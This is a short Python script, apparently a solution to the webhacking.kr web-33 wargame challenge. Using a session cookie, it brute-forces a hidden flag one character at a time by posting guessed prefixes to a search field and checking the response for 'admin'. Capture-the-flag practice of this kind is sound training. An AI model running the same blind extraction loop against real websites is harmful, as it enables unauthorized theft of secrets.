import requests
import json
info={}
flag="FLAG{"
info['search']=flag
url="https://webhacking.kr/challenge/web-33/index.php"
cookie={"PHPSESSID":"your id"}
code = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E',
'F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V',
'W','X','Y','Z','!','\"','#','$','&','\'','(',')','*','+',',','-','.',
'/',':',';','<','=','>','?','@','[','\\',']','^','`','{','|','}','~','_']
for i in range(0,39): # 44에서 FLAG{를 뺀 39번 반복
    for j in code:
        temp=flag+j
        info['search']=temp
        response=requests.post(url,data=info, cookies=cookie)
        print(response)
        if response.text.find("admin")!=-1:
            flag+=j
            print(flag)
            break
        else:
            info['search']=flag
print("Flag는 ",flag)